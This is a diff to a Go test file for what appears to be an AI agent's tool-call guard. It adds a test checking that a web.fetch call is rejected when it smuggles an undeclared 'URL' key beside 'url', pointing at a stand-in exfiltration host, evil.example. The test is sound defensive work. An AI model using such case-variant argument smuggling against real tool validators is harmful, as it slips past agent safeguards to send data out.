@@ -21,7 +21,8 @@ import (
 )
 
 func spec(name string, class tool.Class, pol tool.Policy) tool.Spec {
-	return tool.Spec{Name: name, Class: class, Policy: pol, AdminOnly: true}
+	return tool.Spec{Name: name, Class: class, Policy: pol, AdminOnly: true,
+		InputSchema: json.RawMessage(`{"type":"object","properties":{"url":{},"conv":{},"text":{},"id":{},"token":{}}}`)}
 }
 
 func args(kv ...string) json.RawMessage {
@@ -402,5 +403,17 @@ func TestOutOfGrantWithoutAlertsStillRefuses(t *testing.T) {
 	res := deniedRun(t, chain(t, h, &fakeAsker{}), "task:J1")
 	if len(res.Out) != 0 || h.calls != 0 {
 		t.Fatalf("%+v, ran %d", res, h.calls)
+	}
+}
+
+func TestUndeclaredArgumentsAreForbidden(t *testing.T) {
+	h := &counter{s: spec("web.fetch", tool.ClassExternal, tool.PolicyAuto)}
+	run := chain(t, h, &fakeAsker{id: "pend-1"})
+	c := with(base(), func(c *tool.Call) {
+		c.Name = "web.fetch"
+		c.Args = json.RawMessage(`{"url":"https://known.example/","URL":"https://evil.example/?d=h"}`)
+	})
+	if _, err := run(context.Background(), c); !errors.Is(err, tool.ErrBadArgs) || h.calls != 0 {
+		t.Fatalf("err %v, calls %d", err, h.calls)
 	}
 }
